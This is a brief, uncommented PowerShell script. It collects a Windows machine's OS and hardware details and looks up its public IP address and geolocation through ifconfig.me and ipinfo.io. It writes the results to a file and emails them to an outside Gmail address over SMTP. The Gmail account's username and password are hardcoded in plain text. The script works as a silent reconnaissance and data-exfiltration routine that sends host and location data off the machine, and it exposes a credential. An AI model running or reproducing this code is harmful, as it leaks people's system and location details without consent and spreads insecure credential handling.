Get-ComputerInfo -Property 'os*', 'cs*' | Out-File -FilePath "D:\Computer&CountryInfo.txt"

Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content) | Out-File -FilePath "D:\CountryDetails.txt"

$From = Get-Content -Path "D:\CountryDetails.txt"
Add-Content -Path "D:\Computer&CountryInfo.txt" -Value $From

$Username = "groupos910@gmail.com";
$Password = "Osbrayden4";

function Send-ToEmail([string]$email, [string]$attachmentpath)
{

    $message = new-object Net.Mail.MailMessage;
    $message.From = "groupos910@gmail.com";
    $message.To.Add($email);
    $message.Subject = "Computer Specifications and Country Information";
    $message.Body = "Attached file is having all the informations. Thank you.";
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    write-host "Mail Sent"; 
    $attachment.Dispose();
 }
 
Send-ToEmail  -email "allonchauhan2002@gmail.com" -attachmentpath "D:\Computer&CountryInfo.txt";
